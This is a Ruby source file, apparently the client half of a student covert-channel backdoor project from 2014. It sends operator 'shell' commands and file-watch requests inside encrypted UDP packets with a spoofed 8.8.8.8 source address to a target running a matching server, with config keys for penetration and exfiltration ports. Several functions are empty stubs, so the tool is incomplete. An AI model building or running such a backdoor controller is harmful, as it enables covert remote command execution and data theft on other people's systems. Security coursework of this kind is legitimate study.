#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   client.rb - description goes here
--
-- PROGRAM:       client
--                ./client.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'readline'
require 'ipaddress'
require_relative 'util.rb'

## Variables

## Application Strings
CONFIG_FILE = "client.conf"
CONFIG_FILE_DEFAULT = "\# Make sure these settings match the server settings\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_FILE_DEFAULT << "\# target_ip = 8.8.8.8\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
PAYLOAD_REGEX = /^(#{AUTH_STRING}) (shell|watch) .+$/
INPUT_REGEX = /^(shell|watch) .+$/

## Functions

def listen_for_knock
  
end

def start_receiving_server
  
end

def validate_target_ip
  if !IPAddress.valid_ipv4?(@cfg_target_ip)
    exit_reason("Invalid target ip address")
  end
end

def start_command_loop
  puts "+ enter a command (2 options)"
  puts "+ shell (cmd)"
  puts "+ watch (dir|file) (path)"
  puts "+ \"ctrl + c\" to exit"
  begin
    loop {
      input = Readline.readline('> ', true)  
      if input.match(INPUT_REGEX)
        send_pkt_server_async(input.strip)
      else
        puts "Incorrect command format"
      end
    }
  rescue Interrupt
    puts "ctrl+c received"
  end
end

def send_pkt_server_async(command)
  if @cfg_pen_protocol == TCP
    # handle TCP here
  elsif @cfg_pen_protocol == UDP
    payload = "#{AUTH_STRING} #{command}"
    if payload.match(PAYLOAD_REGEX)
      udp_packet(payload)
    else
      exit_reason("Error with payload validation")
    end
  end
end

def udp_packet(payload)
  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @cfg_iface)).config
  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")


  #udp_pkt.eth_saddr = 
  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8 may not be needed
  udp_pkt.udp_dst = @cfg_pen_port
  udp_pkt.udp_src = rand(0xffff)
  udp_pkt.ip_saddr = "8.8.8.8"
  #udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
  udp_pkt.ip_daddr = @cfg_target_ip
  udp_pkt.payload = encrypt(payload)

  udp_pkt.recalc
  udp_pkt.to_w(@cfg_iface)

  puts "udp packet sent #{@cfg_target_ip} on #{@cfg_pen_port}"
end

## Main

load_config_file
validate_target_ip
puts "+ Welcome to \"not a hacking\" program"
start_command_loop
